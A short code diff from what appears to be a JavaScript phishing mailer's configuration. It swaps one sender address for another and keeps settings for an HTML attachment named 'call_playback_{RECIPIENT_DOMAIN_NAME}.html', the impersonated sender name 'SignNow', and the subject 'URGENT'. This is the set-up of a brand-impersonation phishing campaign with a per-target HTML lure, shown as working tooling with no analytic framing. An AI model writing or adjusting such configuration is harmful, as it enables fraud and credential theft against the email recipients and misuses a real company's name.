@@ -122,7 +122,7 @@ const options = {
 
 
 const attachmentNameWithPlaceholders = 'call_playback_{RECIPIENT_DOMAIN_NAME}.html';
-const senderAddresses = ['carnecrea@lit.com.uy'];
+const senderAddresses = ['carnecrea@fucrea.org'];
 const messageFile = 'message.html';
 const senderNameWithPlaceholders = "SignNow"; 
 const subjectLineWithPlaceholders = "URGENT";
